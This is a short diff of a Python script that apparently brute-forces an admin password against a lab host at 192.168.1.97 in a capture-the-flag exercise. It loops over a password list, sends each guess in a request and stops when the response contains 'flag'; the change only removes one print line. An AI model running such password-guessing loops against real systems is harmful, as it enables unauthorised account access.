@@ -20,5 +20,4 @@ for pwd in list_pwd:
         r = requests.get("http://192.168.1.97/", form)
     if "flag" in r.text:
         print("The password for admin is :", tmp)
-        print("the flag is :")
         break
